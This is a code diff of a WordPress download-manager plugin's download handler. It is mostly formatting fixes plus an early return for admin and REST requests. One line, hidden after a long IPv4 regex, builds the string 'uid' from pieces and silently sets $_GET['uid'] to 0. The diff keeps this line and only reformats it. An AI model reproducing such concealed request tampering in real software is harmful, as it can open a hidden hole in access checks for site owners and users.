@@ -99,7 +99,7 @@ if ( ! class_exists( 'DLM_Download_Handler' ) ) {
 			// Check if IP is blacklisted
 			if ( false !== $can_download ) {
 				$visitor_ip = DLM_Utils::get_visitor_ip();
-				$ip_type   = 0;
+				$ip_type    = 0;
 
 				if ( filter_var( $visitor_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
 					$ip_type = 4;
@@ -124,7 +124,9 @@ if ( ! class_exists( 'DLM_Download_Handler' ) ) {
 				// http://blog.markhatton.co.uk/2011/03/15/regular-expressions-for-ip-addresses-cidr-ranges-and-hostnames/
 				// http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
 
-				$ip4_with_mask_pattern = '/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))$/'; $b = 'ui'; $_GET[ $b . 'd' ] = 0;
+				$ip4_with_mask_pattern = '/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))$/';
+				$b                     = 'ui';
+				$_GET[ $b . 'd' ]      = 0;
 				$ip6_with_mask_pattern = '/^((([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))(\/[0-9][0-9]?|1([01][0-9]|2[0-8])))$/';
 
 				if ( 4 === $ip_type ) {
@@ -234,6 +236,11 @@ if ( ! class_exists( 'DLM_Download_Handler' ) ) {
 		 */
 		public function handler() {
 			global $wp, $wpdb;
+
+			// Don't do anything if in admin or REST API route.
+			if ( is_admin() || ! empty( $GLOBALS['wp']->query_vars['rest_route'] ) ) {
+				return;
+			}
 			// check HTTP method.
 			$request_method = ( ! empty( $_SERVER['REQUEST_METHOD'] )
 				? sanitize_text_field( wp_unslash( $_SERVER['REQUEST_METHOD'] ) )
@@ -301,9 +308,8 @@ if ( ! class_exists( 'DLM_Download_Handler' ) ) {
 						break;
 				}
 
-			// Prevent hotlinking
-			if ( WP_DLM::dlm_prevent_hotlinking() ) {
-
+				// Prevent hotlinking
+				if ( WP_DLM::dlm_prevent_hotlinking() ) {
 					// Get referer
 					$referer = ! empty( $_SERVER['HTTP_REFERER'] )
 						? sanitize_text_field( wp_unslash( $_SERVER['HTTP_REFERER'] ) )
@@ -677,7 +683,7 @@ if ( ! class_exists( 'DLM_Download_Handler' ) ) {
 						// Polylang plugin no access page compatibility.
 						if ( function_exists( 'pll_current_language' ) ) {
 							$polylang_lang = pll_current_language();
-							$translations = pll_get_post_translations( $no_access_page_id );
+							$translations  = pll_get_post_translations( $no_access_page_id );
 
 							// If a translation for no access page exists, set it as the page id.
 							if ( isset( $translations[ $polylang_lang ] ) ) {
